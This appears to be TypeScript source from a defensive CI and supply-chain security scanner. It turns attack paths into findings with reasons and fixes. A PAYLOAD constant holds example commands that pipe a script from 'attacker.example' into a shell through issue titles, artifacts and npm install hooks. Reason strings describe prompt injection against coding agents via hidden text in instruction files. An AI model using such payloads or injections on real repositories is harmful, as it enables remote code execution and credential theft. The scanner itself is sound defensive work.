/**
 * Engine — reachability → ranking → assembled findings (U7 step 2).
 *
 * Runs the graph reachability (per entry, sink), ranks + labels each path (U3),
 * and assembles the stable `Finding` shape: concrete path, sink, a reachability
 * reason, a remediation, and OWASP labels. Reason/remediation are derived from the
 * path's archetype (which layers it crosses), not free-form.
 */

import { rankFindings, type RankedFinding } from '../graph/ranking';
import { reachablePaths, type ReachPath } from '../graph/reachability';
import type {
  AgentGrantNode,
  AttackNode,
  CiJobNode,
  DependencyNode,
  SinkNode,
} from '../graph/types';
import { type Finding, type FindingEvidence, tierForSink } from '../findings/finding';
import { agenticLabel, mcpLabel } from '../taxonomy/owasp';
import type { BuildResult } from './build';

/** A short human label for a node in a rendered path. */
function nodeLabel(n: AttackNode): string {
  switch (n.kind) {
    case 'entry':
      return n.label;
    case 'dependency':
      return `${n.pkg}@${n.version}`;
    case 'ci-job':
      return `${n.workflow}#${n.job}`;
    case 'agent-grant':
      return `${n.source} (${n.capabilityClass}:${n.scope})`;
    case 'sink':
      return n.identity;
  }
}

function find<T extends AttackNode>(path: ReachPath, kind: T['kind']): T | undefined {
  return path.nodes.find((n): n is T => n.kind === kind);
}

/** A fork-PR path whose triggering job is actor-gated to trusted roles (U17). */
function isGuardedForkPr(path: ReachPath): boolean {
  return path.entry.entryKind === 'fork-pr' && path.entry.guarded === true;
}

/**
 * Fixed illustrative payloads per fail-eligible sink class (0048 / KTD6). Never derived from
 * repo content, so they cannot echo a secret; renderers keep them off public surfaces (R10).
 */
const PAYLOAD = {
  text: 'Issue/PR title or comment: x"; curl -s https://attacker.example/p.sh | sh; echo "',
  artifact: 'Artifact file contents: $(curl -s https://attacker.example/p.sh | sh)',
  forkPr:
    'The PR edits a script this step runs, e.g. package.json "test": "curl -s https://attacker.example/p.sh | sh"',
  install:
    'The PR adds a dependency with "preinstall": "curl -s https://attacker.example/p.sh | sh"',
} as const;

/**
 * Where the path's attacker input lands, and — when the path is a proven exploit shape —
 * the payload that demonstrates it (0048 / KTD5). A path is fail-eligible only for: an
 * untrusted-text entry with an `execution` sink, a fork-PR whose job runs code after the
 * untrusted checkout, or a new dependency whose install script runs in a fork-triggerable
 * job. Anything else gets location-only evidence (or none) and can at most warn.
 */
function proof(path: ReachPath): { at?: { file: string; line: number }; payload?: string } {
  const job = find<CiJobNode>(path, 'ci-job');
  const dep = find<DependencyNode>(path, 'dependency');
  switch (path.entry.entryKind) {
    case 'untrusted-text-injection': {
      const at = path.entry.evidence;
      if (path.entry.sinkClass !== 'execution') {
        return { at };
      }
      return {
        at,
        payload: path.entry.label.includes('artifact') ? PAYLOAD.artifact : PAYLOAD.text,
      };
    }
    case 'fork-pr':
      return { at: job?.execEvidence, payload: job?.execEvidence ? PAYLOAD.forkPr : undefined };
    case 'new-dependency':
      if (dep && job?.forkTriggerable) {
        return {
          at: job.installEvidence,
          payload: job.installEvidence ? PAYLOAD.install : undefined,
        };
      }
      return {};
    default:
      return {};
  }
}

/** Assemble `Finding.evidence` from a path's proof; `undefined` when nothing is locatable. */
function evidenceFor(path: ReachPath): FindingEvidence | undefined {
  const { at, payload } = proof(path);
  if (!at) {
    return undefined;
  }
  return {
    file: at.file,
    line: at.line,
    capability: path.sink.identity,
    ...(payload ? { payload } : {}),
  };
}

/** Derive the reachability reason + remediation from the path's cross-layer shape. */
function describe(path: ReachPath): { reason: string; remediation: string } {
  const dep = find<DependencyNode>(path, 'dependency');
  const job = find<CiJobNode>(path, 'ci-job');
  const grant = find<AgentGrantNode>(path, 'agent-grant');
  const sink: SinkNode = path.sink;
  const isSecret = sink.sinkKind === 'secret' || sink.sinkKind === 'credential';

  if (path.entry.entryKind === 'untrusted-text-injection') {
    const where = job ? `${job.workflow}#${job.job}` : 'the workflow';
    // 0042: a workflow_run job splicing downloaded-artifact contents into a shell is a
    // distinct injection shape from event-text — give it its own reason/fix.
    if (path.entry.label.includes('artifact')) {
      return {
        reason:
          `${path.entry.label} — job ${where} runs on \`workflow_run\` and splices the contents of an ` +
          `artifact built by the untrusted \`pull_request\` run into a shell (e.g. \`$(<file)\`), so ` +
          `attacker-controlled artifact content is injected into a privileged command holding ` +
          `${sink.sinkKind} ${sink.identity}.`,
        remediation:
          `Never splice downloaded-artifact contents into a shell; pass the artifact as a quoted argument ` +
          `to a trusted committed script, validate it, and keep ${sink.identity} out of the workflow_run job.`,
      };
    }
    const cls = path.entry.sinkClass;
    if (cls === 'agent-ingested') {
      return {
        reason:
          `${path.entry.label} — a coding agent in job ${where} ingests attacker-authored event text while ` +
          `the job holds ${sink.sinkKind} ${sink.identity}. Agent ingestion is not a proven exploit on its ` +
          `own: whether the agent can be steered to reach ${sink.identity} depends on its tools and outbound ` +
          `access, which Blastgate does not yet model — so this warns rather than fails.`,
        remediation:
          `Keep ${sink.identity} out of the agent job, restrict the workflow to trusted actors, and deny the ` +
          `agent shell/network tools it does not need (the Agents Rule of Two).`,
      };
    }
    if (cls === 'action-input' || cls === 'unrecognized') {
      const where2 =
        cls === 'action-input'
          ? 'a third-party action input'
          : 'a field Blastgate does not classify';
      return {
        reason:
          `${path.entry.label} — attacker-authored event text is passed to ${where2} in job ${where}, which ` +
          `holds ${sink.sinkKind} ${sink.identity}. Whether that input is executed depends on code Blastgate ` +
          `cannot see offline, so this warns rather than fails.`,
        remediation:
          `Pass untrusted text via \`env:\` and quote it, review how the action uses the input, and remove ` +
          `${sink.identity} from the untrusted-triggered job ${where}.`,
      };
    }
    return {
      reason:
        `${path.entry.label} — attacker-authored text from an untrusted event is read by job ${where}, ` +
        `which holds ${sink.sinkKind} ${sink.identity}. A prompt/command injection in that text (e.g. an ` +
        `HTML comment invisible on the rendered page but read via the API) can drive the job to exfiltrate it.`,
      remediation:
        `Do not pass untrusted event text (issue/PR/comment body) into a privileged step; restrict the ` +
        `workflow to trusted actors (author_association / github.actor) and remove ${sink.identity} from the ` +
        `untrusted-triggered job.`,
    };
  }

  if (path.entry.entryKind === 'agent-config-change') {
    return {
      reason:
        `${path.entry.label} — an untrusted change that adds or edits an agent instruction file is a ` +
        `prompt injection against any maintainer who reviews it with a coding agent (the same class as ` +
        `lockfile poisoning). Hidden content (HTML comments, zero-width/bidi text) makes it invisible on review.`,
      remediation:
        `Review ${sink.identity} as untrusted input before running any agent over the change; do not let a ` +
        `coding agent act on instruction files introduced by an external contributor.`,
    };
  }

  if (path.entry.entryKind === 'gate-tamper') {
    return {
      reason:
        `${path.entry.label} — this change removes Blastgate's own enforcement (${sink.identity}). ` +
        `Disabling the gate before making a change it would block is the obvious bypass, so a change that ` +
        `takes the gate out is itself flagged for review.`,
      remediation:
        `Restore the removed enforcement, or confirm the un-adoption is intentional and reviewed by a ` +
        `maintainer — do not let an automated change disable the gate.`,
    };
  }

  if (path.entry.entryKind === 'ci-divergent') {
    return {
      reason:
        `${path.entry.label} — an install/build script that changes behavior based on whether ` +
        `it runs in CI, a container, or an interactive terminal is the concealment technique used ` +
        `to keep a malicious lifecycle payload dormant exactly where it would be observed.`,
      remediation:
        `Remove the environment-conditional branch from the install/build script (or justify it in ` +
        `review); where lifecycle scripts are not required, install with \`npm ci --ignore-scripts\`.`,
    };
  }

  if (path.entry.entryKind === 'privileged-hook') {
    const location = path.entry.label.replace(/ \(committed hook\)$/, '');
    return {
      reason:
        `${path.entry.label} runs a shell command outside Claude Code's permission gate — a ` +
        `standing privileged capability (${sink.identity}). It fires deterministically, not via ` +
        `prompt injection, so it is not externally attacker-controllable; the risk is an ` +
        `over-scoped or untrusted hook command.`,
      remediation:
        `Review the hook command in ${location}, keep it minimal and repo-local, and remove the ` +
        `hook if it is not required.`,
    };
  }

  if (dep && job && isSecret) {
    const untrusted = job.forkTriggerable
      ? ', which is triggered by untrusted input (fork PRs)'
      : '';
    if (dep.ecosystem === 'python') {
      return {
        reason:
          `${dep.pkg} runs code at install time (\`pip install\` executes it), and it runs in job ` +
          `${job.workflow}#${job.job}${untrusted}, which holds ${sink.sinkKind} ${sink.identity} — ` +
          `the shape of a malicious setup.py executed in CI / a Dependabot container.`,
        remediation:
          `Do not \`pip install\` untrusted code in that job (prefer \`--only-binary=:all:\` or a ` +
          `locked, hash-pinned install), or remove ${sink.identity} from ${job.workflow}#${job.job}.`,
      };
    }
    return {
      reason:
        `New or changed dependency ${dep.pkg}@${dep.version} declares an install script that ` +
        `executes in job ${job.workflow}#${job.job}${untrusted} and holds ${sink.sinkKind} ` +
        `${sink.identity}, which the script can exfiltrate.`,
      remediation:
        `Gate lifecycle scripts in that job (e.g. run \`npm ci --ignore-scripts\`) or remove ` +
        `${sink.identity} from ${job.workflow}#${job.job}.`,
    };
  }

  if (grant && isSecret) {
    return {
      reason:
        `Injectable agent surface ${grant.source} grants ${grant.capabilityClass} capability ` +
        `(${grant.scope}) that can read and exfiltrate ${sink.sinkKind} ${sink.identity}.`,
      remediation:
        `Scope the ${grant.capabilityClass} grant in ${grant.source} to the minimum required, ` +
        `or keep ${sink.identity} out of the agent's reach.`,
    };
  }

  if (grant) {
    return {
      reason:
        `Injectable agent surface ${grant.source} grants ${grant.capabilityClass} capability ` +
        `(${grant.scope}) that exceeds the least-privilege baseline and reaches ${sink.identity}.`,
      remediation:
        `Scope the ${grant.capabilityClass} grant in ${grant.source} down to the minimum ` +
        `required path/host, or remove it.`,
    };
  }

  if (job && isSecret) {
    if (isGuardedForkPr(path)) {
      return {
        reason:
          `Job ${job.workflow}#${job.job} triggers on untrusted events ` +
          `(${job.triggers.join(', ')}) and holds ${sink.sinkKind} ${sink.identity}, but its ` +
          `\`if:\` is actor-gated to trusted roles — so it is not externally triggerable, though ` +
          `the broad credential scope remains a least-privilege risk.`,
        remediation:
          `Scope ${sink.identity} down to least privilege for ${job.workflow}#${job.job}; the ` +
          `actor guard limits who can trigger the job but not its blast radius when it runs.`,
      };
    }
    return {
      reason:
        `Job ${job.workflow}#${job.job} is triggered by untrusted input ` +
        `(${job.triggers.join(', ')}) and holds ${sink.sinkKind} ${sink.identity}, which is ` +
        `exfiltratable from an untrusted run.`,
      remediation:
        `Remove ${sink.identity} from the untrusted-triggerable job ${job.workflow}#${job.job}, ` +
        `or restrict its triggers to trusted events.`,
    };
  }

  return {
    reason: `${path.entry.label} reaches ${sink.sinkKind} ${sink.identity} in ${path.hops} hop(s).`,
    remediation: `Break the path from ${path.entry.label} to ${sink.identity}.`,
  };
}

/**
 * The fail contract (0048 / KTD5, plan R1/R8): `fail` requires a secret or code-write sink,
 * a fail-eligible entry, and complete evidence including the payload. Everything else that
 * is reachable warns. The actor-guard downgrade (U17) still applies on top.
 */
function tierFor(path: ReachPath, evidence: FindingEvidence | undefined): 'fail' | 'warn' {
  if (isGuardedForkPr(path) || tierForSink(path.sink.sinkKind) !== 'fail') {
    return 'warn';
  }
  return evidence?.payload ? 'fail' : 'warn';
}

function toFinding(ranked: RankedFinding): Finding {
  const { path, labels, score } = ranked;
  const { reason, remediation } = describe(path);
  const proven = evidenceFor(path);
  const tier = tierFor(path, proven);
  // The payload is a fail's proof; a warn keeps only the location + capability pointer.
  const evidence =
    proven && tier !== 'fail'
      ? { file: proven.file, line: proven.line, capability: proven.capability }
      : proven;
  const labelStrings = [
    labels.agentic ? agenticLabel(labels.agentic) : undefined,
    labels.mcp ? mcpLabel(labels.mcp) : undefined,
  ].filter((s): s is string => s !== undefined);

  return {
    id: `${path.entry.id}=>${path.sink.id}`,
    // Proven-exploit contract (0048); an actor-gated fork-PR path warns (U17).
    tier,
    score,
    path: path.nodes.map(nodeLabel),
    pathNodeIds: path.nodes.map((n) => n.id),
    hops: path.hops,
    entry: { kind: path.entry.entryKind, label: path.entry.label },
    sink: { kind: path.sink.sinkKind, identity: path.sink.identity },
    reason,
    remediation,
    owasp: labels,
    labels: labelStrings,
    ...(evidence ? { evidence } : {}),
  };
}

/** Most-severe first, with a fully deterministic tie-break for byte-identical output. */
function compareFindings(a: Finding, b: Finding): number {
  if (a.score !== b.score) {
    return b.score - a.score;
  }
  if (a.hops !== b.hops) {
    return a.hops - b.hops;
  }
  return a.id < b.id ? -1 : a.id > b.id ? 1 : 0;
}

/** Assemble ranked findings from a built graph (U7 step 2). */
export function assembleFindings(build: BuildResult): Finding[] {
  return rankFindings(reachablePaths(build.graph)).map(toFinding).sort(compareFindings);
}
